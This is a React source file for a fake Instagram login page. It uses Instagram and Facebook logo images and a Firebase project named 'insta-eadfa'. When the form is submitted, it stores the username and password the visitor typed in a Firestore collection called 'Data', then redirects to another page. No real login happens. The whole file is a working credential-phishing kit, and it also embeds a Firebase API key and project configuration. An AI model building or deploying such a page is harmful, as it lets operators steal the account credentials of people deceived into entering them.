import React, { useState } from 'react';
import { initializeApp } from "firebase/app";
import {  getFirestore } from "firebase/firestore";
import { collection,addDoc } from 'firebase/firestore';
import { useNavigate } from 'react-router-dom';
import ig from '../pics/ig.png';
import sep from '../pics/seperator.png';
import fb from '../pics/fb.png';
import Dont from '../pics/Dont.png';







function UserInputForm() {
  
  const firebaseConfig = {
    apiKey: "AIzaSyAPFbdmGdGgSfpgyPh5rUZhSy7Nx4JhffA",
    authDomain: "insta-eadfa.firebaseapp.com",
    projectId: "insta-eadfa",
    storageBucket: "insta-eadfa.appspot.com",
    messagingSenderId: "806541063026",
    appId: "1:806541063026:web:f391313faea32eb8f163eb",
    measurementId: "G-P4LZDN9EQF"
  };
  
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);
  


const navigate = useNavigate();



  const [name, setName] = useState('');
  const [pass, setPass] = useState('');

  const handleNameChange = (event) => {
    setName(event.target.value);
  };

  const handleEmailChange = (event) => {
    setPass(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    console.log(`Name: ${name}\nEmail: ${pass}`);
    addDoc(collection(db, "Data"), {
      usernamename: {name},
      password: {pass}
    })
    
    .then(
      navigate('/two')
    )
   };

      
      
      
    
    


  return (
    <div>
    

<form onSubmit={handleSubmit}>


  <div> <div className='flex flex-col gap-3 w-[100%] p-10'>
          <div className='mx-auto my-4'><img src={ig} alt='ss' /></div>
          <div><input type="text" value={name} onChange={handleNameChange} placeholder="username" className='w-full outline-none border rounded-md pl-1 py-2 border-[#e1e1e1] bg-[#fafafa]' /> </div>
          <div> <input type="password" value={pass} onChange={handleEmailChange} placeholder="Password" className='w-full outline-none border rounded-md pl-1 py-2 border-[#e1e1e1] bg-[#fafafa]'  /></div>
          <div><span className='text-[#3797EF] text-sm float-right font-semibold'>Forgot password?</span></div>
          <div className='bg-[#3797EF] text-center text-sm font-medium text-white rounded-md my-4'><button type="submit" className=' py-4 '>Log in</button></div>
          <div className='text-center mx-auto my-4'><img src={fb} alt='ss' /></div>
          <div className='text-center mx-auto my-4'><img src={sep} alt='ss' /></div>
          <div className='mx-auto my-4'><img src={Dont} alt='ss' /></div>
        </div></div>






       
         
</form>
       

        
      
      
    
    </div>
    
  );
}

export default UserInputForm;

